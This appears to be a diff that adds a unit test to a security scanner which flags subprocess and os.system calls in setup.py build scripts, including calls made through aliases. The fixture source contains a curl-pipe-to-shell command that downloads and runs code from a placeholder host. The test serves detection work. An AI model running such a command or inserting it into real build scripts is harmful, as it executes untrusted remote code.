@@ -304,6 +304,43 @@ def test_build_script_calls_carry_their_arguments() -> None:
     assert {(c.args, c.args_key) for c in sensitive_calls(src.encode())} == {(None, None)}
 
 
+def test_build_script_calls_through_an_alias_are_the_calls_they_name() -> None:
+    """``run = subprocess.call; run([...])`` in setup.py is a subprocess.call:
+    the rule page says calls resolve through simple aliasing, and the module
+    index did, but the build-script index compared the alias's name."""
+    from garnet_guard.facts.pyindex import index_build_script, sensitive_calls
+
+    src = (
+        "import subprocess, os\n"
+        "run = subprocess.call\n"
+        "sp = subprocess\n"
+        "sh = os.system\n"
+        "run(['sh', '-c', 'curl https://x.invalid | sh'])\n"
+        "sp.check_call(['make'])\n"
+        "def build():\n"
+        "    sh('make docs')\n"
+    )
+    calls = index_build_script(src.encode())
+    assert [(c.name, c.line, c.via) for c in calls] == [
+        ("subprocess.call", 5, None),
+        ("subprocess.check_call", 6, None),
+        ("os.system", 8, "build"),
+    ]
+    assert calls[0].args == "(['sh', '-c', 'curl https://x.invalid | sh'])"
+    # The alias counts from where it is assigned, not before, and a name the
+    # file defines isn't an alias even when a module has that name.
+    late = "import subprocess\nrun(['x'])\nrun = subprocess.call\n"
+    assert [c.line for c in index_build_script(late.encode())] == []
+    shadow = "import subprocess\ndef call(cmd):\n    return cmd\ncall(['x'])\n"
+    assert index_build_script(shadow.encode()) == ()
+    # The module index (GRN-C012's names) resolves the same way.
+    assert {c.name for c in sensitive_calls(src.encode())} == {
+        "subprocess.call",
+        "subprocess.check_call",
+        "os.system",
+    }
+
+
 def test_sensitive_calls_anywhere_names_the_enclosing_function() -> None:
     from garnet_guard.facts.pyindex import sensitive_calls
 
